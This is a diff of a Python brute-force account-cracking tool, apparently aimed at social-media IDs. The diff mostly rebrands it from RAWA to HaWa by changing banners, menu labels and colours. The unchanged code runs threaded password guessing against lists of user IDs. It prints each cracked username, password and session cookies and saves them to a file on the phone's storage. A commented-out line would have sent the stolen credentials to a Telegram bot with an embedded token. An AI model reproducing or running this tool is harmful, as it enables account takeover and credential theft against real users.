@@ -287,18 +287,14 @@ def back():
         login()
 #LOGO
 def banner():
-        print("""\033[1;32m
+        print("""\x1b[1;96m
         
 
-
-########:::::'###::::'##:::::'##::::'###::::
- ##.... ##:::'## ##::: ##:'##: ##:::'## ##:::
- ##:::: ##::'##:. ##:: ##: ##: ##::'##:. ##::
- ########::'##:::. ##: ##: ##: ##:'##:::. ##:
- ##.. ##::: #########: ##: ##: ##: #########:
- ##::. ##:: ##.... ##: ##: ##: ##: ##.... ##:
- ##:::. ##: ##:::: ##:. ###. ###:: ##:::: ##:
-..:::::..::..:::::..:::...::...:::..:::::..::
+__  __     _       __     
+   / / / /___ | |     / /___ _
+  / /_/ / __ `/ | /| / / __ `/
+ / __  / /_/ /| |/ |/ / /_/ / 
+/_/ /_/\__,_/ |__/|__/\__,_/ 
 
 """)
 os.system('clear')
@@ -306,10 +302,10 @@ banner()
 #MENU
 def menu():
        	print()
-        print(f'\x1b[1;92m  1 - CR4CK FILE ALL ID(VIP)')
+        print(f'  \x1b[1;94m1 - CR4CK FILE')
         #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
 
-        _____BRADOSTI_____ = input('  HALBZHERA : ')
+        _____BRADOSTI_____ = input('  x1b[1;94mHALBZHERA : ')
         if _____BRADOSTI_____ in ['1']:
                 F()
                 print(' \x1b[1;91m\x1b[1;96m{H} LogOut Successful ')
@@ -392,9 +388,9 @@ def BB():
     banner()
     passwrd()
 def passwrd():
-        print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
+        #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
         #print(f"\x1b[1;93m    [+]BARWAR : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")
-        print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
+        #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
         with tred(max_workers=30) as pool:
                 for yuzong in id2:
                         idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -492,7 +488,7 @@ def passwrd():
 def crack(idf,pwv):
         global loop,ok,cp
         bo = random.choice([m,k,h,b,u,x])
-        sys.stdout.write(f"\r[RAWA-B-api-🐊]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}"),
+        sys.stdout.write(f"\r\x1b[1;92m[HaWa🌪️]\x1b[0;34m{Z}{b}{loop}{Z}|{b}{len(id)} \033[33m[\x1b[1;91mOK∙{ok}\033[41m\x1b[1;97m] {P}{'{:.0%}'.format(loop/float(len(id)))}"),
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua2 = random.choice(ugen2)
@@ -547,9 +543,9 @@ def crack(idf,pwv):
                                 coki=po.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                 
-                                print(f'\r{H}[ RAWA-OK ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
+                                print(f'\r\033[41m\x1b[1;97m[ HaWa ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
                                 #requests.get(f"https://api.telegram.org/bot64396283355944082446:AAGQu9RhPGuhxAnB3p9e9Nbp9b96xySTYfA/sendMessage?chat_id=5753556142&text=｛shex-hama ok｝ OK \n OK   :  : {idf} \n│   PS  : {pw}  ")
-                                open('/sdcard/𝑅𝑂𝑌𝐴𝐿-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
+                                open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                 cek_SURCHY(kuki)
                                 break
                         else:
